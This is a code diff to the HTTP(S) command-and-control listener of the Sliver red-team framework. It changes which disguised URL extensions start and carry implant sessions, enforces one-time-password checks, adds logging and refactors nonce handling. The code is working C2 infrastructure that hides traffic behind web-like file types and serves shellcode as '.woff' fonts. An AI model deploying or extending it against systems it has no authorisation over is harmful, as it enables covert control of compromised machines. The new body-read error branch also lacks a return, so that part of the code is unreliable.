@@ -194,6 +194,7 @@ func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 			active: &map[string]*HTTPSession{},
 			mutex:  &sync.RWMutex{},
 		},
+		EnforceOTP: true,
 	}
 	server.HTTPServer = &http.Server{
 		Addr:         conf.Addr,
@@ -284,13 +285,13 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// Procedural C2
 	// ===============
 	// .txt = rsakey
-	// .php = start / session
+	// 1.phtml / .php = start / session
 	// .js = poll
 	// .png = stop
 	// .woff = sliver shellcode
 
 	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
-	router.HandleFunc("/{rpath:.*\\1.php$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
+	router.HandleFunc("/{rpath:.*\\.phtml$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
 	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
@@ -430,6 +431,7 @@ func default404Handler(resp http.ResponseWriter, req *http.Request) {
 // [ HTTP Handlers ] ---------------------------------------------------------------
 
 func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
+	httpLog.Info("Public key request")
 	if s.EnforceOTP {
 		otpCode, err := getOTPFromURL(req.URL)
 		if err != nil {
@@ -458,6 +460,7 @@ func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request
 }
 
 func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
+	httpLog.Info("Start session request")
 	if s.EnforceOTP {
 		otpCode, err := getOTPFromURL(req.URL)
 		if err != nil {
@@ -488,14 +491,18 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
 	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
 
-	nonce, err := strconv.Atoi(req.URL.Query().Get("_"))
+	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, err := encoders.EncoderFromNonce(nonce)
 	if err != nil {
 		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
 		resp.WriteHeader(404)
 		return
 	}
-	body, _ := ioutil.ReadAll(req.Body)
+	body, err := ioutil.ReadAll(req.Body)
+	if err != nil {
+		httpLog.Errorf("Failed to read body %s", err)
+		resp.WriteHeader(404)
+	}
 	data, err := encoder.Decode(body)
 	if err != nil {
 		httpLog.Errorf("Failed to decode body %s", err)
@@ -514,14 +521,14 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 
 	httpSession := newHTTPSession()
 	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
-	httpSession.Session = &core.Session{
-		// ID:            core.NextSessionID(),
+	httpSession.Session = core.Sessions.Add(&core.Session{
+		ID:            core.NextSessionID(),
 		Transport:     "http(s)",
 		RemoteAddress: getRemoteAddr(req),
 		Send:          make(chan *sliverpb.Envelope, 16),
 		RespMutex:     &sync.RWMutex{},
 		Resp:          map[uint64]chan *sliverpb.Envelope{},
-	}
+	})
 	httpSession.Session.UpdateCheckin()
 	s.HTTPSessions.Add(httpSession)
 	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
@@ -543,6 +550,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 }
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
+	httpLog.Info("Session request")
 	httpSession := s.getHTTPSession(req)
 	if httpSession == nil {
 		httpLog.Infof("No session with id %#v", httpSession.ID)
@@ -550,7 +558,7 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 		return
 	}
 
-	nonce, err := strconv.Atoi(req.URL.Query().Get("_"))
+	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, err := encoders.EncoderFromNonce(nonce)
 	if err != nil {
 		httpLog.Infof("Request specified an invalid encoder (%d)", nonce)
@@ -604,7 +612,7 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 	}
 
 	// We already know we have a valid nonce because of the middleware filter
-	nonce, _ := strconv.Atoi(req.URL.Query().Get("_"))
+	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, _ := encoders.EncoderFromNonce(nonce)
 	select {
 	case envelope := <-httpSession.Session.Send:
